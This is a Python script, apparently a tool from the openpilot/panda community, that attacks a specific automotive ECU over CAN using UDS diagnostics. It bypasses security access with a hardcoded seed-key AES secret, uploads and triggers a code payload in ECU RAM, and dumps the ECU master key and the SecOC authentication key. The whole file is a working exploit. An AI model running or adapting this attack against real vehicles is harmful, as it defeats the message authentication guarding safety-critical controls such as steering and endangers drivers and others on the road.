#!/usr/bin/env python3

import struct
import time
import binascii

from Crypto.Cipher import AES
from tqdm import tqdm

from panda import Panda
try:
    # If openpilot is installed
    from panda.python.uds import UdsClient, ACCESS_TYPE, SESSION_TYPE, DATA_IDENTIFIER_TYPE, SERVICE_TYPE, ROUTINE_CONTROL_TYPE, NegativeResponseError
except ImportError:
    # If installed from pip
    from panda.uds import UdsClient, ACCESS_TYPE, SESSION_TYPE, DATA_IDENTIFIER_TYPE, SERVICE_TYPE, ROUTINE_CONTROL_TYPE, NegativeResponseError

ADDR = 0x7a1
DEBUG = False
BUS = 0

SEED_KEY_SECRET = b'\xf0\x5f\x36\xb7\xd7\x8c\x03\xe2\x4a\xb4\xfa\xef\x2a\x57\xd0\x44'

# These are the key and IV used to encrypt the payload in build_payload.py
DID_201_KEY = b'\x00' * 16
DID_202_IV = b'\x00' * 16


if __name__ == "__main__":
    panda = Panda()
    panda.set_safety_mode(Panda.SAFETY_ELM327)

    uds_client = UdsClient(panda, ADDR, ADDR + 8, BUS, timeout=0.1, response_pending_timeout=0.1, debug=DEBUG)

    print("Getting application versions...")

    try:
        data = uds_client.read_data_by_identifier(DATA_IDENTIFIER_TYPE.APPLICATION_SOFTWARE_IDENTIFICATION)
        print(" - APPLICATION_SOFTWARE_IDENTIFICATION (application)", data)
    except NegativeResponseError:
        print("Can't read application software identification. Please cycle ignition.")
        exit(1)

    if data != b'\x018965B4209000\x00\x00\x00\x00':
        print("Unexpected application version!", data)
        exit(1)

    # Mandatory flow of diagnostic sessions
    uds_client.diagnostic_session_control(SESSION_TYPE.DEFAULT)
    uds_client.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC)
    uds_client.diagnostic_session_control(SESSION_TYPE.PROGRAMMING)

    # Get bootloader version
    uds_client.diagnostic_session_control(SESSION_TYPE.DEFAULT)
    uds_client.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC)
    data = uds_client.read_data_by_identifier(DATA_IDENTIFIER_TYPE.APPLICATION_SOFTWARE_IDENTIFICATION)
    print(" - APPLICATION_SOFTWARE_IDENTIFICATION (bootloader) ", data)

    if data != b'\x01!!!!!!!!!!!!!!!!':
        print("Unexpected bootloader version!", data)
        exit(1)

    # Go back to programming session
    uds_client.diagnostic_session_control(SESSION_TYPE.PROGRAMMING)

    # Security Access - Request Seed
    seed_payload = b"\x00" * 16
    seed = uds_client.security_access(ACCESS_TYPE.REQUEST_SEED, data_record=seed_payload)

    key = AES.new(SEED_KEY_SECRET, AES.MODE_ECB).decrypt(seed_payload)
    key = AES.new(key, AES.MODE_ECB).encrypt(seed)

    print("\nSecurity Access...")

    print(" - SEED:", seed.hex())
    print(" - KEY:", key.hex())

    # Security Access - Send Key
    uds_client.security_access(ACCESS_TYPE.SEND_KEY, key)
    print(" - Key OK!")

    print("\nPreparing to upload payload...")

    # Write something to DID 203, not sure why but needed for state machine
    uds_client.write_data_by_identifier(0x203, b"\x00" * 5)

    # Write KEY and IV to DID 201/202, prerequisite for request download
    print(" - Write data by identifier 0x201", DID_201_KEY.hex())
    uds_client.write_data_by_identifier(0x201, DID_201_KEY)

    print(" - Write data by identifier 0x202", DID_202_IV.hex())
    uds_client.write_data_by_identifier(0x202, DID_202_IV)

    # Request download to RAM
    data = b"\x01" # [1] Format
    data += b"\x46" # [2] 4 size bytes, 6 address bytes
    data += b"\x01" # [3] memoryIdentifier
    data += b"\x00" # [4]
    data += struct.pack('!I', 0xfebf0000) # [5] Address
    data += struct.pack('!I', 0x1000) # [9] Size

    print("\nUpload payload...")

    print(" - Request download")
    resp = uds_client._uds_request(SERVICE_TYPE.REQUEST_DOWNLOAD, data=data)

    # Upload payload
    payload = open("payload.bin", "rb").read()
    assert len(payload) == 0x1000
    chunk_size = 0x400
    for i in range(len(payload) // chunk_size):
        print(f" - Transfer data {i}")
        uds_client.transfer_data(i + 1, payload[i * chunk_size:(i + 1) * chunk_size])

    uds_client.request_transfer_exit()

    print("\nVerify payload...")

    # Routine control 0x10f0
    # [0] 0x31 (routine control)
    # [1] 0x01 (start)
    # [2] 0x10f0 (routine identifier)
    # [4] 0x45 (format, 4 size bytes, 5 address bytes)
    # [5] 0x0
    # [6] mem addr
    # [10] mem addr
    data = b"\x45\x00"
    data += struct.pack('!I', 0xfebf0000)
    data += struct.pack('!I', 0x1000)

    uds_client.routine_control(ROUTINE_CONTROL_TYPE.START, 0x10f0, data)
    print(" - Routine control 0x10f0 OK!")

    print("\nTrigger payload...")

    # Now we trigger the payload by trying to erase
    # [0] 0x31 (routine control)
    # [1] 0x01 (start)
    # [2] 0xff00 (routine identifier)
    # [4] 0x45 (format, 4 size bytes, 5 address bytes)
    # [5] 0x0
    # [6] mem addr
    # [10] mem addr
    data = b"\x45\x00"
    data += struct.pack('!I', 0xe0000)
    data += struct.pack('!I', 0x8000)

    # Manually send so we don't get stuck waiting for the response
    # uds_client.routine_control(ROUTINE_CONTROL_TYPE.START, 0xff00, data)
    erase = b"\x31\x01\xff\x00" + data
    panda.isotp_send(ADDR, erase, bus=BUS)

    print("\nDumping keys...")
    start = 0xfebe6e34
    end = 0xfebe6ff4

    extracted = b""

    with open(f'data_{start:08x}_{end:08x}.bin', 'wb') as f:
        with tqdm(total=end-start) as pbar:
            while start < end:
                for addr, _, data, bus in panda.can_recv():
                    if data == b"\x03\x7f\x31\x78\x00\x00\x00\x00": # Skip response pending
                        continue

                    if addr != ADDR + 8:
                        continue

                    print(data.hex())

                    ptr = struct.unpack("<I", data[:4])[0]
                    assert (ptr >> 8) == start & 0xffffff # Check lower 24 bits of address

                    extracted += data[4:]
                    f.write(data[4:])
                    f.flush()

                    start += 4
                    pbar.update(4)

    print("\nECU_MASTER_KEY   ", extracted[0x2c:0x3c].hex())
    print("SecOC Key (KEY_4)", extracted[0x8c:0x9c].hex())
